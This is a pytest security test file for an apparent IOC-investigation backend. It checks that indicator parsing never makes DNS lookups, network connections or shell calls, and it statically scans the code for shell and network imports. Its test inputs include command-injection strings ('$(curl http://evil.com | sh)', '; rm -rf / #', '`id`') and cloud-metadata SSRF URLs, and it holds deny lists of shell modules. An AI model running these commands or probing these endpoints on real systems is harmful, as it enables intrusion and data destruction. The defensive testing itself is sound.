"""Security guarantees: IOC processing never touches the network or a shell."""

import ast
import socket
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app.core.config import Settings
from app.main import create_app
from app.services.ioc import parse_ioc

APP_DIR = Path(__file__).resolve().parents[1] / "app"

HOSTILE_IOCS = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:8000/health",
    "http://localhost/admin",
    "http://[::1]/",
    "http://[::ffff:127.0.0.1]/",
    "https://example.com/malware.exe",
    "hxxp://evil[.]example[.]com/payload",
    "ftp://files.example.org/sample.zip",
    "example.com",
    "localhost",
    "internal.corp",
    "8.8.8.8",
    "10.0.0.1",
    "::1",
    "d41d8cd98f00b204e9800998ecf8427e",
    "http://2130706433/",
    "$(curl http://evil.com | sh)",
    "; rm -rf / #",
    "`id`",
]


class NetworkAccessError(AssertionError):
    pass


@pytest.fixture
def no_network(monkeypatch: pytest.MonkeyPatch) -> list[str]:
    """Fail loudly on any DNS lookup or outbound connection attempt."""
    attempts: list[str] = []

    def guard(name: str):
        def blocked(*args, **kwargs):
            attempts.append(name)
            raise NetworkAccessError(f"IOC processing attempted network access via {name}")

        return blocked

    monkeypatch.setattr(socket, "getaddrinfo", guard("getaddrinfo"))
    monkeypatch.setattr(socket, "gethostbyname", guard("gethostbyname"))
    monkeypatch.setattr(socket, "gethostbyname_ex", guard("gethostbyname_ex"))
    monkeypatch.setattr(socket, "create_connection", guard("create_connection"))
    monkeypatch.setattr(socket.socket, "connect", guard("socket.connect"))
    monkeypatch.setattr(socket.socket, "connect_ex", guard("socket.connect_ex"))
    return attempts


@pytest.mark.parametrize("raw", HOSTILE_IOCS)
def test_parse_ioc_makes_no_network_calls(no_network: list[str], raw: str) -> None:
    try:
        parse_ioc(raw)
    except ValueError:
        pass  # invalid input is fine; reaching the network is not

    assert no_network == []


def test_api_endpoints_make_no_network_calls(no_network: list[str], client: TestClient) -> None:
    for raw in HOSTILE_IOCS:
        client.post("/api/investigate", json={"ioc": raw})
    client.post("/api/investigate/bulk", json={"iocs": HOSTILE_IOCS})

    assert no_network == []


INTERNAL_IOCS = [
    "127.0.0.1",
    "10.0.0.1",
    "192.168.1.1",
    "169.254.169.254",
    "::1",
    "fe80::1",
    "::ffff:127.0.0.1",
    "localhost",
    "metadata.google.internal",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]:8000/admin",
]


def test_live_mode_never_contacts_network_for_internal_iocs(
    no_network: list[str], tmp_path: Path
) -> None:
    # Real HTTP client and fake keys: any outbound attempt would hit the socket guard.
    settings = Settings(
        _env_file=None,
        database_url=f"sqlite:///{tmp_path / 'test.db'}",
        demo_mode=False,
        virustotal_api_key="fake-key-for-test",
        abuseipdb_api_key="fake-key-for-test",
        otx_api_key="fake-key-for-test",
    )
    with TestClient(create_app(settings)) as client:
        for raw in INTERNAL_IOCS:
            body = client.post("/api/investigate", json={"ioc": raw}).json()
            assert {r["status"] for r in body["enrichment"]["results"]} <= {
                "skipped",
                "not_supported",
            }

    assert no_network == []


def test_guard_actually_detects_network_access(no_network: list[str]) -> None:
    with pytest.raises(NetworkAccessError):
        socket.getaddrinfo("example.com", 80)
    assert no_network == ["getaddrinfo"]


# --- Static checks over the whole backend -----------------------------------

SHELL_MODULES = {"subprocess", "pty", "pexpect", "sh"}
SHELL_CALLS = {"system", "popen", "spawnl", "spawnv", "execv", "execl", "execvp", "execlp"}
NETWORK_MODULES = {"socket", "http.client", "urllib.request", "httpx", "requests", "aiohttp"}
# Only provider adapters and feed adapters may make network calls, and only to
# their fixed endpoints (enforced in providers/base.py and feeds/base.py).
NETWORK_ALLOWED_DIRS = {APP_DIR / "providers", APP_DIR / "feeds"}


def _app_modules() -> list[tuple[Path, ast.Module]]:
    return [(path, ast.parse(path.read_text(), str(path))) for path in APP_DIR.rglob("*.py")]


def _imported_modules(tree: ast.Module) -> set[str]:
    names: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            names.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            names.add(node.module)
    return names


def test_backend_never_imports_shell_execution_modules() -> None:
    for path, tree in _app_modules():
        roots = {name.split(".")[0] for name in _imported_modules(tree)}
        assert not roots & SHELL_MODULES, f"{path} imports a shell-execution module"


def test_backend_never_calls_shell_eval_or_exec() -> None:
    for path, tree in _app_modules():
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            if isinstance(func, ast.Name):
                assert func.id not in {"eval", "exec", "compile"}, f"{path} calls {func.id}"
            if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
                if func.value.id == "os":
                    assert func.attr not in SHELL_CALLS, f"{path} calls os.{func.attr}"


def test_only_adapters_may_import_network_clients() -> None:
    for path, tree in _app_modules():
        if any(allowed in path.parents for allowed in NETWORK_ALLOWED_DIRS):
            continue
        imported = _imported_modules(tree)
        assert not imported & NETWORK_MODULES, f"{path} imports a network client"
